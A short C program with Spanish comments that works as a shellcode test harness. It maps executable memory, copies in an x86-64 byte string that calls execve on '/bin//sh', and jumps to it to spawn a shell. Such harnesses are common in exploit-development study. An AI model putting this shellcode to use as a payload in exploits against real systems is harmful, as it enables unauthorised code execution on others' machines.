#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

unsigned char shellcode[] =
  "\x48\x31\xf6\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"
  "\x48\xc1\xeb\x08\x53\x48\x89\xe7\xb0\x3b\x0f\x05";

int main() {
    // Reservar memoria ejecutable
    void *mem = mmap(NULL, sizeof(shellcode),
                     PROT_READ | PROT_WRITE | PROT_EXEC,
                     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    if (mem == MAP_FAILED) {
        perror("mmap");
        return 1;
    }

    // Copiar la shellcode a la memoria
    memcpy(mem, shellcode, sizeof(shellcode));

    // Ejecutar la shellcode
    ((void(*)())mem)();

    return 0;
}
